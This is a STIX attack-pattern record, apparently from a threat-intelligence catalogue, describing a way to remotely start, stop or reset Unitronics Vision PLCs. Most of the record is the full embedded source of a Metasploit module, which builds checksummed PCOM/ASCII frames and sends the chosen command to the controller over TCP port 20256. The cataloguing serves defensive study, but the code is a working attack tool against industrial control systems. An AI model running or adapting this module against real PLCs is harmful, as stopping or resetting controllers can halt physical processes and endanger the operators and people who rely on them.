{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--914b0948-5354-48a0-920a-28d0dd7b3bc2",
    "created": "2024-08-14T16:22:21.693382Z",
    "modified": "2024-08-14T16:22:21.693386Z",
    "name": "Unitronics PCOM remote START/STOP/RESET command",
    "description": " Unitronics Vision PLCs allow remote administrative functions to control the PLC using authenticated PCOM commands.  This module supports START, STOP and RESET operations. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/scada/pcom_command.rb",
            "external_id": "pcom_command.rb"
        },
        {
            "source_name": "reference",
            "url": "https://unitronicsplc.com/Download/SoftwareUtilities/Unitronics%20PCOM%20Protocol.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::Tcp\n  include Rex::Socket::Tcp\n  include Rex::Text\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Unitronics PCOM remote START/STOP/RESET command',\n      'Description'   => %q{\n        Unitronics Vision PLCs allow remote administrative functions to control\n        the PLC using authenticated PCOM commands.\n\n        This module supports START, STOP and RESET operations.\n      },\n      'Author'        =>\n        [\n          'Luis Rosa <lmrosa[at]dei.uc.pt>'\n        ],\n      'License'       => MSF_LICENSE,\n      'References'    =>\n        [\n          [ 'URL', 'https://unitronicsplc.com/Download/SoftwareUtilities/Unitronics%20PCOM%20Protocol.pdf' ]\n        ],\n     ))\n\n    register_options(\n      [\n        OptEnum.new('MODE', [true, 'PLC command', 'RESET', ['START', 'STOP', 'RESET']]),\n        Opt::RPORT(20256),\n        OptInt.new('UNITID', [ false, 'Unit ID (0 - 127)', 0]),\n      ])\n  end\n\n  # compute and return the checksum of a PCOM ASCII message\n  def pcom_ascii_checksum(msg)\n    (msg.each_byte.inject(:+) % 256 ).to_s(16).upcase.rjust(2, '0')\n  end\n\n  # compute pcom length\n  def pcom_ascii_len(pcom_ascii)\n    Rex::Text.hex_to_raw(pcom_ascii.length.to_s(16).rjust(4,'0').unpack('H4H4').reverse.pack('H4H4'))\n  end\n\n  # return a pcom ascii formatted request\n  def pcom_ascii_request(command)\n    unit_id = datastore['UNITID'].to_s(16).rjust(2,'0')\n    # PCOM/ASCII\n    pcom_ascii_payload = \"\" +\n      \"\\x2f\" + # '/'\n      unit_id +\n      command +\n      pcom_ascii_checksum(unit_id + command) + # checksum\n      \"\\x0d\" # '\\r'\n\n    # PCOM/TCP header\n    Rex::Text.rand_text_hex(2) + # transaction id\n      \"\\x65\" + # ascii (101)\n      \"\\x00\" + # reserved\n      pcom_ascii_len(pcom_ascii_payload) + # length\n      pcom_ascii_payload\n  end\n\n  def run\n    connect\n    case datastore['MODE']\n    when 'START'\n      print_status 'Sending START command'\n      ascii_code = \"\\x43\\x43\\x52\" # CCR\n    when 'STOP'\n      print_status 'Sending STOP command'\n      ascii_code = \"\\x43\\x43\\x53\" # CCS\n    when 'RESET'\n      print_status 'Sending RESET command'\n      ascii_code = \"\\x43\\x43\\x45\" # CCE\n    else\n      print_error \"Unknown MODE\"\n      return\n    end\n\n    sock.put(pcom_ascii_request(ascii_code)) #\n    ans = sock.get_once\n    if ans.to_s[10,2] == 'CC'\n      print_status 'Command accepted'\n    end\n    disconnect\n  end\nend\n"
}